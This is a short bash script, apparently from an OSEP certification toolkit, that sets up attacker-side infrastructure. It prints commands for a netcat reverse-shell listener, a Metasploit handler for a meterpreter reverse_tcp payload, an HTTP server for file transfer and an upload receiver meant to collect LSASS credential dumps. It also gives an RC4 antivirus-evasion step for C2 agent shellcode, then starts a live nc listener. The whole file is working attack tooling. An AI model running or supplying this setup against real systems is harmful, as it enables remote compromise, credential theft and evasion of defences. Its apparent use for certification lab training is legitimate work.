#!/usr/bin/env bash
# OSEP - Kali listener quick-setup
# Usage: ./setup_listeners.sh [port]  (default 443)
# Adaptix C2: start your Adaptix server first, then use this for raw nc fallback

PORT=${1:-443}

echo "[*] Starting listeners on port $PORT"
echo ""
echo "  [1] netcat (raw shell):"
echo "      rlwrap nc -lvnp $PORT"
echo ""
echo "  [2] Metasploit (meterpreter staged — use with msfvenom stager shellcode):"
echo "      msfconsole -q -x 'use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT $PORT; run'"
echo ""
echo "  [3] Python HTTP server (file transfer):"
echo "      python3 -m http.server 80"
echo ""
echo "  [4] Python upload receiver (to receive LSASS dumps etc.):"
echo "      pip install uploadserver && python3 -m uploadserver 8080"
echo ""
echo "  [5] Adaptix C2 — start normally via your Adaptix binary."
echo "      Generate agent shellcode from Adaptix UI, pipe to av_evasion.py:"
echo "      python3 ../evasion/av_evasion.py rc4 'YourKey' adaptix_agent.bin runner.ps1"
echo ""

# Actually start a background nc listener
if command -v rlwrap &>/dev/null; then
    echo "[*] Launching: rlwrap nc -lvnp $PORT"
    rlwrap nc -lvnp "$PORT"
else
    echo "[*] rlwrap not found — launching plain nc"
    nc -lvnp "$PORT"
fi
